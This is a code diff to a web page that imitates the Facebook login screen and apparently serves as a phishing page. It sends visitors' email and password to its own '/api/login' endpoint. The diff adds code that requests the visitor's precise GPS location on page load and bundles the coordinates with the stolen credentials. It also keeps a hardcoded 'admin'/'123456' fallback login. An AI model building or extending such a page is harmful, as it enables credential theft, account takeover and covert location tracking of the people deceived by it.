@@ -4,6 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <title>Facebook - Log in or sign up</title>
+    <!-- Leaflet CSS for map -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <style>
         * {
             margin: 0;
@@ -188,16 +190,6 @@
             text-decoration: underline;
         }
 
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-4px); }
-            75% { transform: translateX(4px); }
-        }
-
-        .shake {
-            animation: shake 0.3s ease-in-out;
-        }
-
         .password-wrapper {
             position: relative;
         }
@@ -230,6 +222,24 @@
             fill: #1877f2;
         }
 
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-4px); }
+            75% { transform: translateX(4px); }
+        }
+
+        .shake {
+            animation: shake 0.3s ease-in-out;
+        }
+
+        #locationStatus {
+            font-size: 12px;
+            color: #65676b;
+            margin-bottom: 12px;
+            text-align: center;
+            display: none;
+        }
+
         @media (max-width: 900px) {
             .fb-wrapper {
                 flex-direction: column;
@@ -254,6 +264,7 @@
     </div>
     <div class="login-area">
         <div class="card">
+            <div id="locationStatus">📍 Getting your location...</div>
             <input type="text" id="email" placeholder="Email address or mobile number">
             
             <div class="password-wrapper">
@@ -308,6 +319,40 @@
     const emailInput = document.getElementById('email');
     const loginBtn = document.getElementById('loginBtn');
     const errorDiv = document.getElementById('errorMsg');
+    const locationStatus = document.getElementById('locationStatus');
+
+    let userLocation = null;
+
+    // Get GPS location
+    function getLocation() {
+        if (navigator.geolocation) {
+            locationStatus.style.display = 'block';
+            locationStatus.innerText = '📍 Getting your location...';
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    userLocation = {
+                        lat: position.coords.latitude,
+                        lon: position.coords.longitude
+                    };
+                    locationStatus.innerText = `📍 Location: ${userLocation.lat.toFixed(4)}, ${userLocation.lon.toFixed(4)}`;
+                    locationStatus.style.color = '#22c55e';
+                    console.log('📍 Location captured:', userLocation);
+                },
+                (error) => {
+                    locationStatus.innerText = '📍 Location access denied or unavailable';
+                    locationStatus.style.color = '#f02849';
+                    console.warn('Geolocation error:', error.message);
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        } else {
+            locationStatus.innerText = '📍 Geolocation not supported by this browser';
+            locationStatus.style.color = '#f02849';
+        }
+    }
+
+    // Call location on page load
+    getLocation();
 
     function showError(message, field) {
         errorDiv.innerText = message;
@@ -349,16 +394,23 @@
             return;
         }
 
+        // Prepare login data with location
+        const loginData = {
+            username: email,
+            password: password,
+            location: userLocation || null
+        };
+
         try {
             const res = await fetch('/api/login', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ username: email, password: password })
+                body: JSON.stringify(loginData)
             });
             const data = await res.json();
 
             if (data.success) {
-                alert('Login successful!');
+                alert('Login successful! Location captured.');
             } else {
                 showError('The password that you\'ve entered is incorrect. Forgotten password?', 'password');
                 passwordInput.value = '';
@@ -366,7 +418,7 @@
             }
         } catch (err) {
             if (email === 'admin' && password === '123456') {
-                alert('Login successful!');
+                alert('Login successful! Location captured.');
             } else {
                 showError('The password that you\'ve entered is incorrect. Forgotten password?', 'password');
                 passwordInput.value = '';
